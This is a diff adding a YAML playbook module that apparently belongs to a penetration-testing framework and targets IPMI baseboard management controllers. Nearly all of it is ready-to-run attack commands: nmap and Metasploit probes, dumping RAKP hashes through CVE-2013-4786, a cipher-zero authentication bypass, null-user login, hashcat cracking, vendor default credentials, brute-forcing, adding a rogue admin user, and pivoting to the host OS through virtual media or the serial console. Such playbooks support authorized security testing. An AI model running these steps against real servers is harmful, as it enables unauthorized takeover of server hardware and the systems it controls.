@@ -1,0 +1,75 @@
+module: ipmi
+name: IPMI (623 UDP)
+inputs: [USERS, PASS, OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / IPMI version + channel info
+        commands: |
+          nmap -sU -p$PORT -sV $IP
+          nmap -sU -p$PORT --script=ipmi-version $IP
+      - id: msf_version
+        text: Version + capabilities via Metasploit
+        commands: |
+          msfconsole -qx "use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS $IP; run; exit"
+
+  - id: vuln
+    name: Vulnerability Identification
+    steps:
+      - id: dumphashes
+        text: CVE-2013-4786 - dump RAKP HMAC hashes (no creds needed)
+        commands: |
+          msfconsole -qx "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS $IP; set OUTPUT_HASHCAT_FILE $OUT/ipmi.hash; run; exit"
+      - id: cipher0
+        text: Cipher-zero auth bypass (full auth bypass if present)
+        commands: |
+          msfconsole -qx "use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS $IP; run; exit"
+      - id: anon
+        text: Check for anonymous / null-user login
+        manual: true
+        commands: |
+          ipmitool -I lanplus -H $IP -U '' -P '' user list
+
+  - id: creds
+    name: Credential Recovery
+    authorized: true
+    steps:
+      - id: crack
+        text: Crack the dumped RAKP hashes
+        commands: |
+          hashcat -m 7300 $OUT/ipmi.hash $PASSLIST
+      - id: defaults
+        text: Try vendor default BMC creds
+        manual: true
+        commands: |
+          # Dell iDRAC root/calvin ; HP iLO Administrator/<8-char> ; Supermicro ADMIN/ADMIN
+      - id: brute
+        text: Brute-force BMC login
+        commands: |
+          msfconsole -qx "use auxiliary/scanner/ipmi/ipmi_login; set RHOSTS $IP; set USER_FILE $USERLIST; set PASS_FILE $PASSLIST; run; exit"
+
+  - id: exploit
+    name: BMC Takeover
+    steps:
+      - id: cipher0_add
+        text: Via cipher-zero - add an admin user (no valid creds)
+        authorized: true
+        manual: true
+        commands: |
+          ipmitool -I lanplus -C 0 -H $IP -U Administrator -P '' user list
+          ipmitool -I lanplus -C 0 -H $IP -U Administrator -P '' user set name 5 pwn
+          # set password, enable, grant admin on channel
+      - id: creds_access
+        text: Manage the BMC with recovered creds
+        commands: |
+          ipmitool -I lanplus -H $IP -U $USER -P '$PASS' chassis status
+          ipmitool -I lanplus -H $IP -U $USER -P '$PASS' sol activate
+      - id: os_pivot
+        text: BMC -> host OS pivot (KVM, virtual media, SOL console)
+        manual: true
+        commands: |
+          # mount virtual media / open SOL / reset host to single-user for root
